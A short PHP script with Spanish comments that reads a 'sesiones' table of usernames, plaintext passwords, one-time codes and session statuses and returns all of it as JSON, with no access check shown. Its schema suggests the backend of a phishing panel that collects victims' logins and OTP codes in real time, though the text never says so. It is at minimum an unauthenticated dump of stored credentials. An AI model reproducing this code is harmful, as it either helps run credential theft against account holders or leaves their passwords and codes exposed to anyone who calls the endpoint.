<?php
// Cargamos las credenciales desde config.php
require_once __DIR__ . "/../controllers/config.php";

try {
    // Creamos el objeto de conexión usando las variables de config.php
    $conexion = new PDO(
        "mysql:host=" . DB_HOST . ";dbname=" . DB_NAME,
        DB_USER,
        DB_PASS,
        array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8mb4")
    );

    // Le decimos a PDO que nos avise si hay errores
    $conexion->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    //echo "Conexión exitosa! ✅";
} catch (PDOException $e) {
    echo "¡Ups! Error al conectar... " . $e->getMessage();
}

// =========================================
// Consulta de los registros
// =========================================

// Definimos el query para obtener los datos de la tabla 
$sql = "SELECT id, session_id, user, pass, otp, status, updated_at FROM sesiones ORDER BY id DESC";

try {
    // Ejecutamos la consulta
    $stmt = $conexion->query($sql);

    // Obtenemos todos los resultados en un arreglo asociativo
    $logs = $stmt->fetchAll(PDO::FETCH_ASSOC);

    // Devolvemos los datos en formato JSON para que JS lo pueda leer
    echo json_encode($logs);

} catch (PDOException $e) {
    // Si falla la consulta, lanzamos el error
    die("Error en la consulta: " . $e->getMessage());
}
?>



